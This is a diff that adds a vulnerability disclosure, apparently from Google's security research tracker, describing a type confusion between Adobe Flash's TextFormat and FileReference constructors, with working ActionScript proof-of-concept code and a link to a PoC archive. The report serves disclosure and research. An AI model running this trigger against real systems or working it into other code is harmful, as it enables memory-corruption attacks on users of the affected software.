@@ -1,0 +1,52 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=422&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+There is a type confusion issue in the TextFormat constructor that is reachable because the FileReference constructor does not verify that the incoming object is of type Object (it only checks that the object is not native backed). The TextFormat constructor first sets a new object to type TextFormat, and then calls into script several times before setting the native backing object. If one of these script calls then calls into the FileReference constructor, the object can be set to type FileReference, and then the native object will be set to the TextFormat, leading to type confusion. A PoC is as follows:
+
+In the main SWF:
+
+var a = new subfr();
+var allTypes:Array = new Array();
+var imageTypes:Object = new Object();
+imageTypes.description = "Images (*.jpg, *.jpeg, *.gif, *.png)";
+imageTypes.extension = "*.jpg; *.jpeg; *.gif; *.png";
+allTypes.push(imageTypes);
+
+var textTypes:Object = new Object();
+textTypes.description = "Text Files (*.txt, *.rtf)";
+textTypes.extension = "*.txt;*.rtf";
+allTypes.push(textTypes);
+var f = new flash.net.FileReference();
+f.cancel.call(a);
+
+Defining subfr:
+
+class subfr extends Object{
+
+
+	public function subfr(){			
+	var n = {valueOf : func};
+    this.valueOf = func;
+	this.toString = func;
+	this.__proto__ = {}; 
+	this.__proto__.__constructor__ = TextFormat;
+	super(this);
+
+}
+
+function func(){
+	
+	this.__proto__ = {}; 
+	this.__proto__.__constructor__ = flash.net.FileReference;
+	super();
+	return "natalie";
+	}
+		
+		
+}
+	
+	
+A sample SWF and fla are attached.
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37878.zip
+
